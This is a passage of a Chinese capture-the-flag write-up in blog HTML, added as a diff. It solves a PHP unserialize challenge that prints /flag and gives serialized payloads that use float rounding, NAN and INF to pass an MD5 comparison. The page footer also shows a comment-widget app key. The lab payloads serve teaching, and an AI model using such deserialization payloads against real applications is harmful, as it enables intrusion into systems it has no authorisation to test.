class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>要求传序列化字符串，传进去之后强制类型转换，数组绕过强碰撞没了，传入的元素长度必须在5以下，那么一些已知的相同MD5的字符串也没了，如果类型不等，值不等，他们的md5相等，就给flag</p>
+<p>php的一个小trick</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113342.png" alt=""></p>
+<p>即如果小数点后面超过14位php就会四舍五入</p>
+<p>这样的话我们构造trick1=2，trick2=2.00000000000000112，序列化之后md5的值就都是2了满足了两个md5强相等</p>
+<p>而其他两个条件也满足</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113358.png" alt=""></p>
+<p>全部满足，所以构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;trick&quot;:2:&#123;s:6:&quot;trick1&quot;;i:2;s:6:&quot;trick2&quot;;d: 2.00000000000000112;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113435.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824113451.png" alt=""></p>
+<p>看wp还有一种payload，利用的是NAN和INF的性质，他们分别代表非数字和无穷大，与任何数据类型（除了true）做强类型或弱类型比较均为false，<a href="https://blog.csdn.net/weixin_43257005/article/details/106118623" target="_blank" rel="noopener">参考</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">&#125;</span><br><span class="line">$tr = <span class="keyword">new</span> trick();</span><br><span class="line">$tr-&gt;trick1 = NAN;</span><br><span class="line">$tr-&gt;trick2 = NAN;</span><br><span class="line"><span class="keyword">echo</span> serialize($tr);</span><br><span class="line"><span class="comment">//O:5:"trick":2:&#123;s:6:"trick1";d:NAN;s:6:"trick2";d:NAN;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">&#125;</span><br><span class="line">$tr = <span class="keyword">new</span> trick();</span><br><span class="line">$tr-&gt;trick1 = INF;</span><br><span class="line">$tr-&gt;trick2 = INF;</span><br><span class="line"><span class="keyword">echo</span> serialize($tr);</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/08/24/ciscn_online/">http://www.blacknight.top/2020/08/24/ciscn_online/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/RCE/"># RCE</a>
+                    
+                        <a href="/tags/serialize/"># serialize</a>
+                    
+                        <a href="/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"># js原型链污染</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/08/17/ichunqiu_cms/">i春秋刷题——实验综合</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
